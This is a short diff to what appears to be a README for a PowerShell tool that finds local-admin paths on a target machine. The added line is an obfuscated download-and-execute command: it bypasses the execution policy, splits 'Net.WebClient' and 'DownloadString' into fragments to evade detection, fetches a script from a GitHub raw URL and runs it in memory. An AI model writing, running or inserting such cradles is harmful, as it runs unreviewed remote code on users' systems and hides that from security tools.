@@ -72,6 +72,9 @@ Check BitLocker
 
 How to run Get-LocalAdminPaths.ps1
 ```
+
+powershell -NoProfile -ExecutionPolicy Bypass -Command "$w=New-Object ('Net'+'.'+'Web'+'Client'); $u=('https://raw.'+'githubu'+'sercontent.com/MselmiMedAziz/Tools/refs/heads/main/Get-LocalAdminPaths.ps1'); & ([scriptblock]::Create($w.('Download'+'String')($u))) -Mode Local"
+
 # On a Windows PE / live Windows that can see the target's disk (physical path):
 .\Get-LocalAdminPaths.ps1 -Mode Physical
 
